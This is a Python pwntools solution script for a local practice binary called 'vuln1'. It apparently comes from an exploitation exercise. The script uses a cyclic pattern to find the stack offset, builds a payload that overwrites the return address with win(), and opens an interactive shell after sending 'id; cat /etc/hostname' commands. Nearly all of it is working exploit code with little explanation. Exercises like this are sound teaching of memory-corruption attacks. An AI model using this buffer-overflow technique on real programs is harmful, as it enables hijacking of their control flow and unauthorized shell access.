#!/usr/bin/env python3
"""Solution for vuln1: ret2win -- overwrite the return address with win().

Key pwntools:
  cyclic / cyclic_find  : auto-compute the buf -> return address offset
  ELF(...).symbols      : win's address (instead of nm)
  flat({off: addr})     : pad to off, then place addr there
  process / sendline    : run locally and send input

Run:  cd example3 && make && python3 solution3/solve_vuln1.py
"""
import os
from pwn import *

context.update(arch="i386", os="linux", log_level="info")

HERE = os.path.dirname(os.path.abspath(__file__))
BIN = os.path.join(HERE, "..", "vuln1")

elf = ELF(BIN, checksec=False)


def find_offset():
    """Send a cyclic pattern, crash, then derive the offset from the core dump."""
    io = process(BIN)
    io.sendline(cyclic(300))
    io.wait()
    core = io.corefile
    off = cyclic_find(core.eip)          # index of the 4 bytes that landed in eip
    io.close()
    log.success("offset(buf -> return address) = %d", off)
    return off


def main():
    offset = find_offset()
    payload = flat({offset: elf.symbols["win"]})   # same as b'A'*offset + p32(win)

    io = process(BIN)
    io.recvuntil(b"overflow me:\n")
    io.sendline(payload)
    log.success("jumping to win @ %#x -- dropping a shell", elf.symbols["win"])
    io.sendline(b"id; cat /etc/hostname; echo PWNED")
    io.interactive()


if __name__ == "__main__":
    main()
